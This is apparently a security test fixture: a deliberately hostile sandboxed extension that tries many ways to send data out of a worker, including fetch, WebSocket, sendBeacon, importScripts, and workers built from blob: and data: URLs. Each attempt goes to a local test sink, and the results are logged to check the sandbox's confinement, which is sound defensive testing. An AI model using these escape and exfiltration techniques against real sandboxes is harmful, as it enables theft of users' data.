// A hostile extension: runs in the sandbox worker and tries every way out it can think of. Each attempt goes to the
// sink on 127.0.0.1 (the port replaces __SINK_PORT__), so the sink's log says what really got through. The result of
// every attempt is stored with nimble.storage.set("attack", json) (one of the few ways to get a message to the app).
//
// outcome: "LEAK" = the attempt worked; "blocked" = it failed; "n/a" = the API is not there; "undefined" = a global
// that must not exist in a worker is indeed missing; "DEFINED" = such a global exists (a failure); "confined" = it
// worked but could do nothing outside (a worker the extension made itself, which inherits the policy).
// Names that start with "lockdown" only hold when the worker bootstrap removed the network APIs (defence in depth);
// the others must hold with the CSP alone.
(async function () {
  var SINK = "http://127.0.0.1:__SINK_PORT__";
  var WSSINK = "ws://127.0.0.1:__SINK_PORT__";
  var results = [];
  function rec(name, outcome, detail) { results.push({ name: name, outcome: outcome, detail: String(detail === undefined ? "" : detail).slice(0, 200) }); }
  function timeout(ms) { return new Promise(function (r) { setTimeout(function () { r({ timeout: true }); }, ms); }); }
  async function attempt(name, fn) {
    try {
      var r = await Promise.race([fn(), timeout(4000)]);
      if (r && r.leak) rec(name, "LEAK", r.d);
      else if (r && r.na) rec(name, "n/a", r.d);
      else if (r && r.confined) rec(name, "confined", r.d);
      else rec(name, "blocked", r && r.timeout ? "no connection before the timeout" : r && r.d);
    } catch (e) { rec(name, "blocked", (e && e.name) + ": " + (e && e.message)); }
  }
  function absent(name) { rec("typeof " + name, typeof self[name] === "undefined" ? "undefined" : "DEFINED", typeof self[name]); }

  // No DOM and no WebRTC in a worker.
  ["window", "document", "parent", "top", "frames", "RTCPeerConnection", "webkitRTCPeerConnection", "RTCSessionDescription", "RTCIceCandidate"].forEach(absent);
  rec("typeof document (bare)", typeof document === "undefined" ? "undefined" : "DEFINED", typeof document);
  try { new RTCDataChannel(); rec("new RTCDataChannel()", "LEAK", "constructed"); } catch (e) { rec("new RTCDataChannel()", "blocked", e.name + ": " + e.message); }
  try { new RTCPeerConnection(); rec("new RTCPeerConnection()", "LEAK", "constructed"); } catch (e) { rec("new RTCPeerConnection()", "blocked", e.name + ": " + e.message); }
  rec("typeof navigator.mediaDevices", typeof navigator.mediaDevices === "undefined" ? "undefined" : "DEFINED", typeof navigator.mediaDevices);

  // The network APIs are gone from the extension's point of view (the worker bootstrap removes them as defence in depth).
  ["fetch", "XMLHttpRequest", "WebSocket", "EventSource", "WebTransport", "importScripts", "Worker", "SharedWorker"].forEach(function (n) {
    rec("lockdown typeof " + n, typeof self[n] === "undefined" ? "undefined" : "DEFINED", typeof self[n]);
  });
  rec("lockdown typeof navigator.sendBeacon", typeof navigator.sendBeacon === "undefined" ? "undefined" : "DEFINED", typeof navigator.sendBeacon);
  // ... and no original is left on the prototype chains to be found there.
  var found = [];
  [self, navigator].forEach(function (start) {
    for (var o = start; o; o = Object.getPrototypeOf(o)) {
      ["fetch", "XMLHttpRequest", "WebSocket", "EventSource", "WebTransport", "importScripts", "Worker", "SharedWorker", "sendBeacon"].forEach(function (n) {
        var d = Object.getOwnPropertyDescriptor(o, n);
        if (d && typeof d.value === "function") found.push(n);
        if (d && typeof d.get === "function" && d.get.call(start) !== undefined) found.push(n + " (getter)");
      });
    }
  });
  rec("lockdown prototype chain holds no original", found.length ? "LEAK" : "undefined", found.join(","));

  // Network.
  await attempt("fetch", async function () { var r = await fetch(SINK + "/t/fetch?d=secret"); return { leak: true, d: "status " + r.status }; });
  await attempt("fetch no-cors", async function () { var r = await fetch(SINK + "/t/fetch-nocors", { mode: "no-cors" }); return { leak: true, d: "type " + r.type }; });
  await attempt("fetch keepalive", async function () { var r = await fetch(SINK + "/t/fetch-keepalive", { method: "POST", body: "secret", keepalive: true, mode: "no-cors" }); return { leak: true, d: "type " + r.type }; });
  await attempt("XMLHttpRequest", function () {
    if (typeof XMLHttpRequest === "undefined") return { na: true, d: "no XHR" };
    return new Promise(function (res) {
      var x = new XMLHttpRequest(); x.open("GET", SINK + "/t/xhr");
      x.onload = function () { res({ leak: true, d: "status " + x.status }); };
      x.onerror = function () { res({ d: "xhr error event" }); };
      try { x.send(); } catch (e) { res({ d: "send threw " + e.name }); }
    });
  });
  await attempt("WebSocket", function () {
    return new Promise(function (res) {
      var ws; try { ws = new WebSocket(WSSINK + "/t/websocket"); } catch (e) { return res({ d: "constructor threw " + e.name }); }
      ws.onopen = function () { res({ leak: true, d: "open" }); };
      ws.onerror = function () { res({ d: "error event" }); };
      ws.onclose = function () { res({ d: "close event" }); };
    });
  });
  await attempt("EventSource", function () {
    if (typeof EventSource === "undefined") return { na: true, d: "not exposed" };
    return new Promise(function (res) {
      var es; try { es = new EventSource(SINK + "/t/eventsource"); } catch (e) { return res({ d: "constructor threw " + e.name }); }
      es.onopen = function () { res({ leak: true, d: "open" }); };
      es.onerror = function () { res({ d: "error event" }); };
    });
  });
  await attempt("WebTransport", async function () {
    if (typeof WebTransport === "undefined") return { na: true, d: "not exposed" };
    var wt = new WebTransport("https://127.0.0.1:__SINK_PORT__/t/webtransport");
    await wt.ready; return { leak: true, d: "ready" };
  });
  await attempt("importScripts", async function () {
    importScripts(SINK + "/t/importScripts");
    return self.__imp ? { leak: true, d: "script ran" } : { d: "no throw, no run" };
  });
  await attempt("import()", async function () {
    var m = await import(SINK + "/t/import");
    return { leak: true, d: "module " + JSON.stringify(m) };
  });
  await attempt("sendBeacon", async function () {
    if (!navigator.sendBeacon) return { na: true, d: "not exposed" };
    return navigator.sendBeacon(SINK + "/t/sendBeacon", "secret") ? { leak: true, d: "queued" } : { d: "returned false" };
  });
  await attempt("new Worker(http url)", function () {
    var w = new Worker(SINK + "/t/worker-url");
    return new Promise(function (res) { w.onerror = function () { res({ d: "worker error event" }); }; w.onmessage = function () { res({ leak: true, d: "ran" }); }; });
  });
  await attempt("new Worker(data: url)", function () {
    var w = new Worker("data:text/javascript,postMessage(1);fetch('" + SINK + "/t/worker-data')");
    return new Promise(function (res) { w.onerror = function () { res({ d: "worker error event" }); }; w.onmessage = function () { res({ leak: true, d: "ran" }); }; });
  });
  await attempt("new SharedWorker(blob)", function () {
    if (typeof SharedWorker === "undefined") return { na: true, d: "not exposed in a worker" };
    var u = URL.createObjectURL(new Blob(["onconnect=function(e){e.ports[0].postMessage(1);fetch('" + SINK + "/t/sharedworker')}"], { type: "text/javascript" }));
    var w = new SharedWorker(u);
    return new Promise(function (res) { w.onerror = function () { res({ d: "error event" }); }; w.port.onmessage = function () { res({ leak: true, d: "ran" }); }; });
  });
  await attempt("BroadcastChannel to the app window", async function () {
    var bc = new BroadcastChannel("nn-bc"); bc.postMessage("secret-via-broadcast"); bc.close();
    return { d: "posted (the test checks that the app window received nothing)" };
  });

  // A worker made inside the extension must inherit the same limits and have no WebRTC either.
  await attempt("nested Worker (blob)", function () {
    return new Promise(function (res) {
      var code = [
        "var out = { rtc: typeof self.RTCPeerConnection };",
        "async function go() {",
        "  try { await fetch('" + SINK + "/t/nested-fetch'); out.fetch = 'LEAK'; } catch (e) { out.fetch = 'blocked:' + e.name; }",
        "  try { importScripts('" + SINK + "/t/nested-importScripts'); out.importScripts = self.__imp ? 'LEAK' : 'nothrow'; } catch (e) { out.importScripts = 'blocked:' + e.name; }",
        "  await new Promise(function (r) { try { var w = new WebSocket('" + WSSINK + "/t/nested-ws'); w.onopen = function () { out.ws = 'LEAK'; r(); }; w.onerror = function () { out.ws = out.ws || 'blocked'; r(); }; w.onclose = function () { out.ws = out.ws || 'blocked'; r(); }; } catch (e) { out.ws = 'blocked:' + e.name; r(); } });",
        "  postMessage(out);",
        "}",
        "go();"
      ].join("\n");
      var w;
      try { w = new Worker(URL.createObjectURL(new Blob([code], { type: "text/javascript" }))); }
      catch (e) { return res({ d: "creating it threw " + e.name + ": " + e.message }); }
      w.onerror = function (e) { res({ d: "nested worker error event " + (e.message || "") }); };
      w.onmessage = function (e) {
        var o = e.data;
        rec("nested Worker: typeof RTCPeerConnection", o.rtc === "undefined" ? "undefined" : "DEFINED", o.rtc);
        var leaked = /LEAK/.test(JSON.stringify(o));
        res({ leak: leaked, confined: !leaked, d: "created; " + JSON.stringify(o) });
      };
    });
  });

  await nimble.storage.set("attack", JSON.stringify(results));
})();
